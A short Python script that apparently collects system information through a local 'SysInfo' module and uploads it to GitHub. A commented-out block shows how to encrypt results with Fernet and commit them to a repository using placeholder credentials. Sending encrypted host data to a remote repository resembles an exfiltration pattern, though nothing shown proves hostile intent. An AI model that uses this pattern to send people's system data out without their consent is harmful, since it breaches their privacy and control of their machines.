from github import Github
import base64
import cryptography
from cryptography.fernet import Fernet
from SysInfo import System

s = System()
s.to_github()

"""# Step 1: Encrypt the results
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)
results = "Your results here"
encrypted_results = cipher.encrypt(results.encode())

# Step 2: Write the encrypted results to a file
file_path = "path/to/encrypted_file.txt"
with open(file_path, "wb") as file:
    file.write(encrypted_results)

# Step 3: Upload the encrypted file to GitHub
access_token = "YOUR_ACCESS_TOKEN"
g = Github(access_token)
repo_owner = "REPO_OWNER"
repo_name = "REPO_NAME"
repo = g.get_repo(f"{repo_owner}/{repo_name}")
branch_name = "main"  # Or specify the branch you want to work with
commit_message = "Update encrypted file"

try:
    # Get the existing file if it exists
    existing_file = repo.get_contents(file_path, ref=branch_name)

    # Update the file
    repo.update_file(
        path=file_path,
        message=commit_message,
        content=base64.b64encode(encrypted_results).decode(),
        sha=existing_file.sha,
        branch=branch_name
    )

    print("Encrypted file updated successfully!")
except Exception:
    # Create the file if it doesn't exist
    repo.create_file(
        path=file_path,
        message=commit_message,
        content=base64.b64encode(encrypted_results).decode(),
        branch=branch_name
    )

    print("Encrypted file created successfully!")"""
